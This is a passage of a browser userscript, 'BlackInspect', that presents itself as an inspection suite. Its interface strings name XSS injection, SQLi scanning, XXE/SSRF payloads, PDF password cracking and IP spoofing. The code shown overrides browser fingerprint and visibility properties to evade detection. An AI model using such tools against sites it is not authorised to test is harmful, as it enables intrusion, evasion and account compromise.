// ==UserScript==
// @name         BlackInspect v7.1 Ultimate
// @namespace    http://tampermonkey.net/
// @version      7.1.0
// @description  Full inspection & spoofing suite — PDF reader+cracker, Security scanner, Todo+notify, Anti-VM, FPS, Auth injection, Preflight prevention, Vazir font, Panel opacity, Popup panel, Custom right-click, Subdomain takeover, Directory BF, and more.
// @author       You
// @match        *://*/*
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        unsafeWindow
// @grant        GM_download
// @grant        GM_notification
// @require      https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js
// ==/UserScript==

(function () {
    'use strict';
    const D = document, W = unsafeWindow, N = navigator;
    const BS = 'bipv700us';
    let html2canvas = W.html2canvas;
    let pdfjsLib = null;
    let pdfCrackStop = false;

    const domainKey = (base) => `${base}_${location.hostname}`;

    // ==================== Persistent Settings ====================
    const S = {
        // Core
        get ip() { return GM_getValue('ip', ''); }, set ip(v) { GM_setValue('ip', v); },
        get ua() { return GM_getValue('ua', ''); }, set ua(v) { GM_setValue('ua', v); },
        get platform() { return GM_getValue('platform', ''); }, set platform(v) { GM_setValue('platform', v); },
        get language() { return GM_getValue('lang', ''); }, set language(v) { GM_setValue('lang', v); },
        get breakOnStart() { return GM_getValue(domainKey('breakOnStart'), false); }, set breakOnStart(v) { GM_setValue(domainKey('breakOnStart'), v); },
        get canvasSpoof() { return GM_getValue('canvasSpoof', false); }, set canvasSpoof(v) { GM_setValue('canvasSpoof', v); },
        get spoofActive() { return GM_getValue('spoofActive', false); }, set spoofActive(v) { GM_setValue('spoofActive', v); },
        get passwords() { try { return JSON.parse(GM_getValue('passwords', '[]')); } catch (e) { return []; } },
        set passwords(arr) { GM_setValue('passwords', JSON.stringify(arr)); },
        get panelLeft() { return GM_getValue('panelLeft', 10); }, set panelLeft(v) { GM_setValue('panelLeft', v); },
        get panelTop() { return GM_getValue('panelTop', 10); }, set panelTop(v) { GM_setValue('panelTop', v); },
        get panelWidth() { return GM_getValue('panelWidth', Math.min(window.innerWidth - 20, 860)); }, set panelWidth(v) { GM_setValue('panelWidth', v); },
        get panelHeight() { return GM_getValue('panelHeight', Math.min(window.innerHeight - 20, 520)); }, set panelHeight(v) { GM_setValue('panelHeight', v); },
        get activeTab() { return GM_getValue('activeTab', 'Info'); }, set activeTab(v) { GM_setValue('activeTab', v); },
        get lang() { return GM_getValue('langSetting', 'en'); }, set lang(v) { GM_setValue('langSetting', v); },
        get kernelPath() { return GM_getValue('kernelPath', ''); }, set kernelPath(v) { GM_setValue('kernelPath', v); },
        get passFile() { return GM_getValue('passFile', 'passwords.json'); }, set passFile(v) { GM_setValue('passFile', v); },
        get profileFile() { return GM_getValue('profileFile', 'blackinspect_profile.json'); }, set profileFile(v) { GM_setValue('profileFile', v); },
        get breakOptions() { return GM_getValue(domainKey('breakOptions'), { contextmenu: true, copy: true, paste: true, selectstart: true, dragstart: true, mousedown: true }); },
        set breakOptions(v) { GM_setValue(domainKey('breakOptions'), v); },
        // v7.0 New
        get panelOpacity() { return parseFloat(GM_getValue('panelOpacity', '1')); }, set panelOpacity(v) { GM_setValue('panelOpacity', String(v)); },
        get useVazir() { return GM_getValue('useVazir', false); }, set useVazir(v) { GM_setValue('useVazir', v); },
        get tabVisSpoof() { return GM_getValue('tabVisSpoof', false); }, set tabVisSpoof(v) { GM_setValue('tabVisSpoof', v); },
        get authHeaderName() { return GM_getValue('authHeaderName', 'Authorization'); }, set authHeaderName(v) { GM_setValue('authHeaderName', v); },
        get authHeaderValue() { return GM_getValue('authHeaderValue', ''); }, set authHeaderValue(v) { GM_setValue('authHeaderValue', v); },
        get authActive() { return GM_getValue('authActive', false); }, set authActive(v) { GM_setValue('authActive', v); },
        get preventPreflight() { return GM_getValue('preventPreflight', false); }, set preventPreflight(v) { GM_setValue('preventPreflight', v); },
        get todos() { try { return JSON.parse(GM_getValue('todos', '[]')); } catch (e) { return []; } },
        set todos(v) { GM_setValue('todos', JSON.stringify(v)); },
        get customRightClick() { return GM_getValue('customRightClick', false); }, set customRightClick(v) { GM_setValue('customRightClick', v); },
        get fillProfile() { try { return JSON.parse(GM_getValue('fillProfile', '{}')); } catch (e) { return {}; } },
        set fillProfile(v) { GM_setValue('fillProfile', JSON.stringify(v)); },
        get antiVM() { return GM_getValue('antiVM', false); }, set antiVM(v) { GM_setValue('antiVM', v); },
        get hideExtensions() { return GM_getValue('hideExtensions', false); }, set hideExtensions(v) { GM_setValue('hideExtensions', v); },
        get spoofBuildID() { return GM_getValue('spoofBuildID', false); }, set spoofBuildID(v) { GM_setValue('spoofBuildID', v); },
        get kernelUrl() { return GM_getValue('kernelUrl', 'http://localhost:5000'); }, set kernelUrl(v) { GM_setValue('kernelUrl', v); },
    };

    // ==================== Translation System ====================
    const T = (key) => {
        const map = {
            'Info': { en: 'Info', fa: 'اطلاعات' },
            'Vars': { en: 'Vars', fa: 'متغیرها' },
            'Inject': { en: 'Inject', fa: 'تزریق کد' },
            'Spoof': { en: 'Spoof', fa: 'جعل' },
            'Pass': { en: 'Pass', fa: 'رمز' },
            'Storage': { en: 'Storage', fa: 'ذخیره‌سازی' },
            'Tools': { en: 'Tools', fa: 'ابزارها' },
            'DOM': { en: 'DOM', fa: 'DOM' },
            'Canvas': { en: 'Canvas', fa: 'بوم' },
            'ModReq': { en: 'ModReq', fa: 'تغییر درخواست' },
            'Network': { en: 'Network', fa: 'شبکه' },
            'Security': { en: 'Security', fa: 'امنیت' },
            'PDF': { en: 'PDF', fa: 'PDF' },
            'Todo': { en: 'Todo', fa: 'یادداشت' },
            'Sync': { en: 'Sync', fa: 'همگام‌سازی' },
            'Safe': { en: 'Safe', fa: 'امن' },
            'Settings': { en: 'Settings', fa: 'تنظیمات' },
            'BlackInspect v7.0': { en: 'BlackInspect v7.0', fa: 'BlackInspect v7.0' },
            'Server': { en: 'Server', fa: 'سرور' },
            'IP': { en: 'IP', fa: 'IP' },
            'Protocol': { en: 'Protocol', fa: 'پروتکل' },
            'Page': { en: 'Page', fa: 'صفحه' },
            'Desc': { en: 'Desc', fa: 'توضیحات' },
            'Charset': { en: 'Charset', fa: 'کدگذاری' },
            'Viewport': { en: 'Viewport', fa: 'دید' },
            'Links': { en: 'Links', fa: 'لینک‌ها' },
            'Img': { en: 'Img', fa: 'تصاویر' },
            'Scripts': { en: 'Scripts', fa: 'اسکریپت‌ها' },
            'CSS': { en: 'CSS', fa: 'CSS' },
            'Forms': { en: 'Forms', fa: 'فرم‌ها' },
            'Nodes': { en: 'Nodes', fa: 'گره‌ها' },
            'Size': { en: 'Size', fa: 'حجم' },
            'Load': { en: 'Load', fa: 'بارگذاری' },
            'Response Headers': { en: 'Response Headers', fa: 'هدرهای پاسخ' },
            'No headers': { en: 'No headers', fa: 'بدون هدر' },
            'Error': { en: 'Error', fa: 'خطا' },
            'Filter...': { en: 'Filter...', fa: 'فیلتر...' },
            'Scan Variables': { en: 'Scan Variables', fa: 'پویش متغیرها' },
            'Export JSON': { en: 'Export JSON', fa: 'خروجی JSON' },
            'No variables found.': { en: 'No variables found.', fa: 'هیچ متغیری یافت نشد.' },
            'function()': { en: 'function()', fa: 'function()' },
            '(error)': { en: '(error)', fa: '(خطا)' },
            'New value for': { en: 'New value for', fa: 'مقدار جدید برای' },
            'Run Code': { en: 'Run Code', fa: 'اجرای کد' },
            'Executed. Return value:': { en: 'Executed. Return value:', fa: 'اجرا شد. مقدار بازگشتی:' },
            'Template:': { en: 'Template:', fa: 'قالب:' },
            '-- Custom --': { en: '-- Custom --', fa: '-- دلخواه --' },
            'Fake IP (X-Forwarded-For):': { en: 'Fake IP (X-Forwarded-For):', fa: 'IP جعلی:' },
            'User-Agent:': { en: 'User-Agent:', fa: 'User-Agent:' },
            'Platform:': { en: 'Platform:', fa: 'سیستم‌عامل:' },
            'Language:': { en: 'Language:', fa: 'زبان:' },
            'Break on load': { en: 'Break on load', fa: 'شکستن محدودیت‌ها هنگام بارگذاری' },
            'Start Spoofing': { en: 'Start Spoofing', fa: 'شروع جعل' },
            'Stop Spoofing': { en: 'Stop Spoofing', fa: 'توقف جعل' },
            'Spoofing active (applied on load)': { en: 'Spoofing active (applied on load)', fa: 'جعل فعال (در بارگذاری اعمال شد)' },
            'Profile': { en: 'Profile', fa: 'پروفایل' },
            'Export Profile': { en: 'Export Profile', fa: 'خروجی پروفایل' },
            'Import Profile': { en: 'Import Profile', fa: 'وارد کردن پروفایل' },
            'Save Settings': { en: 'Save Settings', fa: 'ذخیره تنظیمات' },
            'Canvas Spoof': { en: 'Canvas Spoof', fa: 'جعل بوم' },
            'Open in Window': { en: 'Open in Window', fa: 'باز کردن در پنجره' },
            'Spoofing started.': { en: 'Spoofing started.', fa: 'جعل شروع شد.' },
            'Spoofing stopped (page reload needed to restore default fetch/XHR)': { en: 'Spoofing stopped (page reload needed to restore default fetch/XHR)', fa: 'جعل متوقف شد (برای بازگردانی، صفحه را مجددا بارگذاری کنید)' },
            'At least one field must be filled.': { en: 'At least one field must be filled.', fa: 'حداقل یک فیلد باید پر شود.' },
            'Profile downloaded.': { en: 'Profile downloaded.', fa: 'پروفایل دانلود شد.' },
            'Profile loaded.': { en: 'Profile loaded.', fa: 'پروفایل بارگذاری شد.' },
            'Invalid file.': { en: 'Invalid file.', fa: 'فایل نامعتبر.' },
            'Settings saved.': { en: 'Settings saved.', fa: 'تنظیمات ذخیره شد.' },
            'Password Generator': { en: 'Password Generator', fa: 'تولید رمز' },
            'Length:': { en: 'Length:', fa: 'طول:' },
            'Numbers': { en: 'Numbers', fa: 'اعداد' },
            'Uppercase': { en: 'Uppercase', fa: 'حروف بزرگ' },
            'Lowercase': { en: 'Lowercase', fa: 'حروف کوچک' },
            'Special': { en: 'Special', fa: 'کاراکترهای خاص' },
            'Generate': { en: 'Generate', fa: 'تولید' },
            'Generated:': { en: 'Generated:', fa: 'رمز تولیدشده:' },
            'Auto-fill username/email': { en: 'Auto-fill username/email', fa: 'پر کردن خودکار نام کاربری/ایمیل' },
            'Use Password': { en: 'Use Password', fa: 'استفاده از رمز' },
            'No password generated.': { en: 'No password generated.', fa: 'رمز تولید نشده.' },
            'Password and username filled.': { en: 'Password and username filled.', fa: 'رمز و نام کاربری پر شد.' },
            'Password filled.': { en: 'Password filled.', fa: 'رمز پر شد.' },
            'Fake Data': { en: 'Fake Data', fa: 'داده‌های ساختگی' },
            'Fill Name': { en: 'Fill Name', fa: 'پر کردن نام' },
            'Fill Email': { en: 'Fill Email', fa: 'پر کردن ایمیل' },
            'Fill Phone': { en: 'Fill Phone', fa: 'پر کردن تلفن' },
            'Fill All': { en: 'Fill All', fa: 'پر کردن همه' },
            'Saved Passwords': { en: 'Saved Passwords', fa: 'رمزهای ذخیره‌شده' },
            'Username': { en: 'Username', fa: 'نام کاربری' },
            'Save Current Password': { en: 'Save Current Password', fa: 'ذخیره رمز فعلی' },
            'Export': { en: 'Export', fa: 'خروجی' },
            'Import': { en: 'Import', fa: 'وارد کردن' },
            'Default save path:': { en: 'Default save path:', fa: 'مسیر پیش‌فرض ذخیره:' },
            'Show Downloads': { en: 'Show Downloads', fa: 'نمایش دانلودها' },
            'Password saved and exported.': { en: 'Password saved and exported.', fa: 'رمز ذخیره و خروجی گرفته شد.' },
            'fields filled.': { en: 'fields filled.', fa: 'فیلد پر شد.' },
            'Cookie & LocalStorage': { en: 'Cookie & LocalStorage', fa: 'کوکی و ذخیره‌سازی محلی' },
            'View Cookies': { en: 'View Cookies', fa: 'مشاهده کوکی‌ها' },
            'View LocalStorage': { en: 'View LocalStorage', fa: 'مشاهده LocalStorage' },
            'No cookies': { en: 'No cookies', fa: 'بدون کوکی' },
            'No localStorage': { en: 'No localStorage', fa: 'LocalStorage خالی' },
            'Name:': { en: 'Name:', fa: 'نام:' },
            'Value:': { en: 'Value:', fa: 'مقدار:' },
            'Set Cookie': { en: 'Set Cookie', fa: 'تنظیم کوکی' },
            'Set LocalStorage': { en: 'Set LocalStorage', fa: 'تنظیم LocalStorage' },
            'Cookie set:': { en: 'Cookie set:', fa: 'کوکی تنظیم شد:' },
            'LocalStorage set:': { en: 'LocalStorage set:', fa: 'LocalStorage تنظیم شد:' },
            'Break Restrictions': { en: 'Break Restrictions', fa: 'شکستن محدودیت‌ها' },
            'Restore Restrictions': { en: 'Restore Restrictions', fa: 'بازگرداندن محدودیت‌ها' },
            'Break Selected': { en: 'Break Selected', fa: 'اعمال موارد انتخابی' },
            'Download Full Page': { en: 'Download Full Page', fa: 'دانلود کامل صفحه' },
            'Copy All Text': { en: 'Copy All Text', fa: 'کپی همه متن' },
            'Stop Loading': { en: 'Stop Loading', fa: 'توقف بارگذاری' },
            'Resume Loading': { en: 'Resume Loading', fa: 'ادامه بارگذاری' },
            'XSS Payload:': { en: 'XSS Payload:', fa: 'بار XSS:' },
            'Inject XSS': { en: 'Inject XSS', fa: 'تزریق XSS' },
            'Show All Passwords': { en: 'Show All Passwords', fa: 'نمایش همه رمزها' },
            'Full Page Screenshot': { en: 'Full Page Screenshot', fa: 'عکس کامل صفحه' },
            'Refresh Page': { en: 'Refresh Page', fa: 'تازه‌سازی صفحه' },
            'Restrictions broken.': { en: 'Restrictions broken.', fa: 'محدودیت‌ها شکسته شد.' },
            'Restrictions restored.': { en: 'Restrictions restored.', fa: 'محدودیت‌ها بازگردانده شد.' },
            'Collecting page...': { en: 'Collecting page...', fa: 'در حال جمع‌آوری صفحه...' },
            'Downloaded!': { en: 'Downloaded!', fa: 'دانلود شد!' },
            'Copied (': { en: 'Copied (', fa: 'کپی شد (' },
            ' characters)': { en: ' characters)', fa: ' کاراکتر)' },
            'XSS payload injected into ': { en: 'XSS payload injected into ', fa: 'بار XSS به ' },
            ' fields.': { en: ' fields.', fa: ' فیلد تزریق شد.' },
            'password fields revealed.': { en: 'password fields revealed.', fa: 'فیلدهای رمز نمایان شد.' },
            'Capturing screenshot...': { en: 'Capturing screenshot...', fa: 'گرفتن عکس کامل صفحه...' },
            'Screenshot saved.': { en: 'Screenshot saved.', fa: 'عکس ذخیره شد.' },
            'html2canvas library not loaded.': { en: 'html2canvas library not loaded.', fa: 'کتابخانه html2canvas بارگذاری نشد.' },
            'DOM Monitor': { en: 'DOM Monitor', fa: 'نمایشگر DOM' },
            'Start': { en: 'Start', fa: 'شروع' },
            'Stop': { en: 'Stop', fa: 'توقف' },
            'Canvas Fingerprint Spoof': { en: 'Canvas Fingerprint Spoof', fa: 'جعل اثر انگشت بوم' },
            'Toggle Spoofing': { en: 'Toggle Spoofing', fa: 'تغییر وضعیت جعل' },
            'Active': { en: 'Active', fa: 'فعال' },
            'Inactive': { en: 'Inactive', fa: 'غیرفعال' },
            'HTTP Request Modifier': { en: 'HTTP Request Modifier', fa: 'تغییردهنده درخواست HTTP' },
            'URL pattern (regex):': { en: 'URL pattern (regex):', fa: 'الگوی URL (regex):' },
            'Header Name:': { en: 'Header Name:', fa: 'نام هدر:' },
            'Header Value:': { en: 'Header Value:', fa: 'مقدار هدر:' },
            'Apply Modifier': { en: 'Apply Modifier', fa: 'اعمال تغییر' },
            'Reset': { en: 'Reset', fa: 'بازنشانی' },
            'Header name required.': { en: 'Header name required.', fa: 'نام هدر الزامی است.' },
            'Invalid regex.': { en: 'Invalid regex.', fa: 'الگوی نامعتبر.' },
            'Header modifier applied to fetch.': { en: 'Header modifier applied to fetch.', fa: 'تغییر هدر روی fetch اعمال شد.' },
            'Reset to default.': { en: 'Reset to default.', fa: 'به پیش‌فرض بازگشت.' },
            'Load Profile from URL': { en: 'Load Profile from URL', fa: 'بارگذاری پروفایل از URL' },
            'Load & Apply': { en: 'Load & Apply', fa: 'بارگذاری و اعمال' },
            'URL required.': { en: 'URL required.', fa: 'آدرس الزامی است.' },
            'Profile loaded from URL.': { en: 'Profile loaded from URL.', fa: 'پروفایل از آدرس بارگذاری شد.' },
            'Safe Mode': { en: 'Safe Mode', fa: 'حالت امن' },
            'Safe Mode features are not yet implemented.': { en: 'Safe Mode features are not yet implemented.', fa: 'قابلیت‌های حالت امن هنوز پیاده‌سازی نشده‌اند.' },
            'Language / زبان': { en: 'Language / زبان', fa: 'Language / زبان' },
            'Apply': { en: 'Apply', fa: 'اعمال' },
            'Python Kernel Path': { en: 'Python Kernel Path', fa: 'مسیر هسته پایتون' },
            'Save Kernel Path': { en: 'Save Kernel Path', fa: 'ذخیره مسیر هسته' },
            'Default Password Filename': { en: 'Default Password Filename', fa: 'نام فایل پیش‌فرض رمز' },
            'Save': { en: 'Save', fa: 'ذخیره' },
            'Default Profile Filename': { en: 'Default Profile Filename', fa: 'نام فایل پیش‌فرض پروفایل' },
            'Choose main.py': { en: 'Choose main.py', fa: 'انتخاب main.py' },
            'Pick save folder': { en: 'Pick save folder', fa: 'انتخاب پوشه ذخیره' },
            'Folder selected. Files will be saved there.': { en: 'Folder selected. Files will be saved there.', fa: 'پوشه انتخاب شد. فایل‌ها در آن ذخیره می‌شوند.' },
            'Choose Folder': { en: 'Choose Folder', fa: 'انتخاب پوشه' },
            'Language changed. Reload to see effect.': { en: 'Language changed. Reload to see effect.', fa: 'زبان تغییر کرد. برای اعمال، صفحه را مجددا بارگذاری کنید.' },
            'Reset Panel Position (Ctrl+Z)': { en: 'Reset Panel Position (Ctrl+Z)', fa: 'بازنشانی موقعیت پنل (Ctrl+Z)' },
            'Split View with AI': { en: 'Split View with AI', fa: 'نمای دوگانه با هوش مصنوعی' },
            'Select AI Service': { en: 'Select AI Service', fa: 'انتخاب سرویس هوش مصنوعی' },
            'Open Split': { en: 'Open Split', fa: 'باز کردن' },
            'ChatGPT': { en: 'ChatGPT', fa: 'ChatGPT' },
            'DeepSeek': { en: 'DeepSeek', fa: 'DeepSeek' },
            'Gemini': { en: 'Gemini', fa: 'Gemini' },
            'Claude': { en: 'Claude', fa: 'Claude' },
            'Kimi': { en: 'Kimi', fa: 'Kimi' },
            // v7.0 New
            'FPS Monitor': { en: 'FPS Monitor', fa: 'نمایشگر FPS' },
            'Start FPS': { en: 'Start FPS', fa: 'شروع FPS' },
            'Stop FPS': { en: 'Stop FPS', fa: 'توقف FPS' },
            'Auth Header Injection': { en: 'Auth Header Injection', fa: 'تزریق هدر احراز هویت' },
            'Header Name': { en: 'Header Name', fa: 'نام هدر' },
            'Token / Value': { en: 'Token / Value', fa: 'توکن / مقدار' },
            'Inject Header': { en: 'Inject Header', fa: 'تزریق هدر' },
            'Stop Injection': { en: 'Stop Injection', fa: 'توقف تزریق' },
            'Injection active.': { en: 'Injection active.', fa: 'تزریق فعال شد.' },
            'Injection stopped.': { en: 'Injection stopped.', fa: 'تزریق متوقف شد.' },
            'Prevent Preflight': { en: 'Prevent Preflight', fa: 'جلوگیری از Preflight' },
            'Preflight prevention active.': { en: 'Preflight prevention active.', fa: 'جلوگیری از Preflight فعال شد.' },
            'SSL/TLS Security Headers': { en: 'SSL/TLS Security Headers', fa: 'هدرهای امنیتی SSL/TLS' },
            'Analyze': { en: 'Analyze', fa: 'آنالیز' },
            'Tab Visibility Spoof': { en: 'Tab Visibility Spoof', fa: 'جعل دید تب' },
            'Tab will always appear visible to scripts.': { en: 'Tab will always appear visible to scripts.', fa: 'تب همیشه برای اسکریپت‌ها مرئی به نظر می‌رسد.' },
            'Hide Browser Extensions': { en: 'Hide Browser Extensions', fa: 'مخفی کردن افزونه‌های مرورگر' },
            'Spoof Firefox BuildID': { en: 'Spoof Firefox BuildID', fa: 'جعل BuildID فایرفاکس' },
            'Anti-VM Detection': { en: 'Anti-VM Detection', fa: 'جلوگیری از تشخیص VM' },
            'XSS Scanner': { en: 'XSS Scanner', fa: 'اسکنر XSS' },
            'SQLi Scanner': { en: 'SQLi Scanner', fa: 'اسکنر SQLi' },
            'Clickjacking Check': { en: 'Clickjacking Check', fa: 'بررسی Clickjacking' },
            'HTML Injection': { en: 'HTML Injection', fa: 'تزریق HTML' },
            'XXE Payloads': { en: 'XXE Payloads', fa: 'بارهای XXE' },
            'SSRF Payloads': { en: 'SSRF Payloads', fa: 'بارهای SSRF' },
            'Subdomain Takeover': { en: 'Subdomain Takeover', fa: 'تصاحب زیردامنه' },
            'Directory BruteForce': { en: 'Directory BruteForce', fa: 'جستجوی مسیر' },
            'Scan': { en: 'Scan', fa: 'اسکن' },
            'Scanning...': { en: 'Scanning...', fa: 'در حال اسکن...' },
            'No URL params found.': { en: 'No URL params found.', fa: 'پارامتر URL یافت نشد.' },
            'VULNERABLE': { en: '⚠ VULNERABLE', fa: '⚠ آسیب‌پذیر' },
            'PROTECTED': { en: '✅ PROTECTED', fa: '✅ محافظت شده' },
            'NOT SET': { en: '❌ NOT SET', fa: '❌ تنظیم نشده' },
            'Read PDF': { en: 'Read PDF', fa: 'خواندن PDF' },
            'Open URL': { en: 'Open URL', fa: 'باز کردن URL' },
            'PDF URL:': { en: 'PDF URL:', fa: 'آدرس PDF:' },
            'Enter PDF password (optional):': { en: 'Enter PDF password (optional):', fa: 'رمز PDF (اختیاری):' },
            'Open': { en: 'Open', fa: 'باز کردن' },
            'Crack Password': { en: 'Crack Password', fa: 'شکستن رمز' },
            'Stop Crack': { en: 'Stop Crack', fa: 'توقف شکستن رمز' },
            'Common Passwords': { en: 'Common Passwords', fa: 'رمزهای رایج' },
            'Custom Wordlist File': { en: 'Custom Wordlist File', fa: 'فایل لیست کلمات دلخواه' },
            'Digit Range (e.g. 0000-9999):': { en: 'Digit Range (e.g. 0000-9999):', fa: 'محدوده اعداد (مثال 0000-9999):' },
            'Found! Password:': { en: 'Found! Password:', fa: 'یافت شد! رمز:' },
            'Not found in list.': { en: 'Not found in list.', fa: 'در لیست یافت نشد.' },
            'Trying...': { en: 'Trying...', fa: 'در حال امتحان...' },
            'Add Task': { en: 'Add Task', fa: 'افزودن وظیفه' },
            'Task description:': { en: 'Task description:', fa: 'توضیح وظیفه:' },
            'Notify at (datetime-local):': { en: 'Notify at (datetime-local):', fa: 'اطلاع‌رسانی در:' },
            'Or notify in (minutes):': { en: 'Or notify in (minutes):', fa: 'یا در (دقیقه):' },
            'Add': { en: 'Add', fa: 'افزودن' },
            'Delete': { en: 'Delete', fa: 'حذف' },
            'Done': { en: '✅ Done', fa: '✅ انجام شد' },
            'Request notification permission': { en: 'Request notification permission', fa: 'درخواست مجوز اعلان' },
            'No tasks yet.': { en: 'No tasks yet.', fa: 'هنوز وظیفه‌ای وجود ندارد.' },
            'Open Panel in Popup': { en: 'Open Panel in Popup', fa: 'باز کردن پنل در پنجره جداگانه' },
            'Custom Right-Click Menu': { en: 'Custom Right-Click Menu', fa: 'منوی کلیک راست سفارشی' },
            'Panel Opacity:': { en: 'Panel Opacity:', fa: 'شفافیت پنل:' },
            'Vazir Font (Persian)': { en: 'Vazir Font (Persian)', fa: 'فونت وزیر (فارسی)' },
            'Form Auto-Fill Profile': { en: 'Form Auto-Fill Profile', fa: 'پروفایل پر کردن خودکار فرم' },
            'Full Name:': { en: 'Full Name:', fa: 'نام کامل:' },
            'Email:': { en: 'Email:', fa: 'ایمیل:' },
            'Phone:': { en: 'Phone:', fa: 'تلفن:' },
            'Address:': { en: 'Address:', fa: 'آدرس:' },
            'Birthday:': { en: 'Birthday:', fa: 'تاریخ تولد:' },
            'Save Profile': { en: 'Save Profile', fa: 'ذخیره پروفایل' },
            'Fill Page Forms': { en: 'Fill Page Forms', fa: 'پر کردن فرم‌های صفحه' },
            'Profile saved.': { en: 'Profile saved.', fa: 'پروفایل ذخیره شد.' },
            'of': { en: 'of', fa: 'از' },
            'PDF Editor': { en: 'PDF Editor', fa: 'ویرایشگر PDF' },
            'Open PDF': { en: 'Open PDF', fa: 'باز کردن PDF' },
            'Save PDF': { en: 'Save PDF', fa: 'ذخیره PDF' },
            'Extract Text': { en: 'Extract Text', fa: 'استخراج متن' },
            'Merge PDFs': { en: 'Merge PDFs', fa: 'ادغام PDF‌ها' },
            'Split PDF': { en: 'Split PDF', fa: 'تقسیم PDF' },
            'Compress': { en: 'Compress', fa: 'فشرده‌سازی' },
            'Text Tool': { en: 'Text Tool', fa: 'ابزار متن' },
            'Draw Tool': { en: 'Draw Tool', fa: 'ابزار رسم' },
            'Highlight': { en: 'Highlight', fa: 'هایلایت' },
            'Shape Tool': { en: 'Shape Tool', fa: 'ابزار شکل' },
            'Eraser': { en: 'Eraser', fa: 'پاک‌کن' },
            'No PDF loaded': { en: 'No PDF loaded', fa: 'PDF بارگذاری نشده' },
            'Saving...': { en: 'Saving...', fa: 'در حال ذخیره...' },
            'Saved!': { en: 'Saved!', fa: 'ذخیره شد!' },
            'Drop PDF here': { en: 'Drop PDF here', fa: 'PDF را اینجا رها کنید' },
            'Date Created': { en: 'Date Created', fa: 'تاریخ ساخت' },
            'Notes': { en: 'Notes', fa: 'یادداشت' },
            'Show done': { en: 'Show done', fa: 'نمایش انجام‌شده' },
            'Delete all tasks': { en: 'Delete all tasks', fa: 'حذف همه تسک‌ها' },
            'Delete all notes': { en: 'Delete all notes', fa: 'حذف همه یادداشت‌ها' },
            'Write a task...': { en: 'Write a task...', fa: 'نوشتن تسک...' },
            'Write a note...': { en: 'Write a note...', fa: 'نوشتن یادداشت...' },
            'No tasks yet!': { en: 'No tasks yet!', fa: 'هنوز تسکی ثبت نکردی!' },
            'No notes yet!': { en: 'No notes yet!', fa: 'هنوز یادداشتی ثبت نکردی!' },
            'Suggestions:': { en: 'Suggestions:', fa: 'موضوعات پیشنهادی:' },
            'Daily tasks': { en: 'Daily tasks', fa: 'کارهای روزانه' },
            'Shopping list': { en: 'Shopping list', fa: 'لیست خرید' },
            'Payment reminder': { en: 'Payment reminder', fa: 'یادآوری پرداخت' },
            'Daily journal': { en: 'Daily journal', fa: 'ژورنال روزانه' },
            'Monthly plan': { en: 'Monthly plan', fa: 'برنامه ماهانه' },
            'Goals list': { en: 'Goals list', fa: 'لیست اهداف' },
            'No tasks found': { en: 'No tasks found', fa: 'تسکی یافت نشد' },
            'No notes found': { en: 'No notes found', fa: 'یادداشتی یافت نشد' },
            'Overdue': { en: 'Overdue', fa: 'گذشته' },
            'No due': { en: 'No due', fa: 'بدون سررسید' },
            'Previous': { en: '◀ Prev', fa: '◀ قبلی' },
            'Next': { en: 'Next ▶', fa: 'بعدی ▶' },
            'Python Kernel URL': { en: 'Python Kernel URL', fa: 'آدرس کرنل پایتون' },
            'Test Kernel': { en: 'Test Kernel', fa: 'تست کرنل' },
        };
        const lang = S.lang || 'en';
        const entry = map[key];
        return entry ? (entry[lang] || entry['en']) : key;
    };
    const _ = T;

    // ==================== Global State ====================
    let panel = null;
    let stopped = false;
    let saveDirectoryHandle = null;
    let restrictionsBroken = false;
    let fpsInterval = null;
    let fpsRafId = null;
    let fpsCount = 0;
    let fpsLastTime = performance.now();
    let currentFps = 0;
    let authOrigFetch = null;
    let authOrigXHR = null;
    let _kernelOnline = false;
    let _kernelIndicator = null;

    // ==================== Vazir Font ====================
    function applyVazirFont() {
        if (!S.useVazir) return;
        const id = 'bi-vazir-font';
        if (D.getElementById(id)) return;
        const lnk = D.createElement('link');
        lnk.id = id;
        lnk.rel = 'stylesheet';
        lnk.href = 'https://cdn.jsdelivr.net/gh/rastikerdar/vazir-font@v30.1.0/dist/font-face.css';
        (D.head||D.documentElement).appendChild(lnk);
        const st = D.createElement('style');
        st.id = 'bi-vazir-style';
        st.textContent = `#${BS}, #${BS} * { font-family: 'Vazir', Consolas, monospace !important; }`;
        D.head.appendChild(st);
    }

    // ==================== Panel Opacity ====================
    function applyPanelOpacity() {
        if (panel) panel.style.opacity = String(S.panelOpacity);
    }

    // ==================== Tab Visibility Spoof ====================
    function applyTabVisibilitySpoof() {
        if (!S.tabVisSpoof) return;
        try {
            Object.defineProperty(D, 'hidden', { get: () => false, configurable: true });
            Object.defineProperty(D, 'visibilityState', { get: () => 'visible', configurable: true });
            D.addEventListener('visibilitychange', e => { e.stopImmediatePropagation(); }, true);
            W.addEventListener('blur', e => { e.stopImmediatePropagation(); }, true);
        } catch (e) { }
    }

    // ==================== Hide Extensions ====================
    function applyHideExtensions() {
        if (!S.hideExtensions) return;
        try {
            const fakePlugins = [];
            Object.defineProperty(fakePlugins, 'item', { value: () => null });
            Object.defineProperty(fakePlugins, 'namedItem', { value: () => null });
            Object.defineProperty(fakePlugins, 'refresh', { value: () => {} });
            Object.defineProperty(N, 'plugins', { get: () => fakePlugins, configurable: true });
            Object.defineProperty(N, 'mimeTypes', { get: () => [], configurable: true });
        } catch (e) { }
    }

    // ==================== Firefox BuildID Spoof ====================
    function applyBuildIDSpoof() {
        if (!S.spoofBuildID) return;
        try {
            if ('buildID' in N) {
                Object.defineProperty(N, 'buildID', { get: () => '20181001000000', configurable: true });
            }
        } catch (e) { }
    }

    // ==================== Anti-VM Detection ====================
    function applyAntiVM() {
        if (!S.antiVM) return;
        try {
            Object.defineProperty(N, 'hardwareConcurrency', { get: () => 8, configurable: true });
            Object.defineProperty(N, 'deviceMemory', { get: () => 8, configurable: true });
            Object.defineProperty(screen, 'width', { get: () => 1920, configurable: true });
            Object.defineProperty(screen, 'height', { get: () => 1080, configurable: true });
            Object.defineProperty(screen, 'availWidth', { get: () => 1920, configurable: true });
            Object.defineProperty(screen, 'availHeight', { get: () => 1040, configurable: true });
            Object.defineProperty(screen, 'colorDepth', { get: () => 24, configurable: true });
            Object.defineProperty(screen, 'pixelDepth', { get: () => 24, configurable: true });
            Object.defineProperty(W, 'outerWidth', { get: () => 1920, configurable: true });
            Object.defineProperty(W, 'outerHeight', { get: () => 1040, configurable: true });
            // Override WebGL renderer info
            const origGetParam = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function (param) {
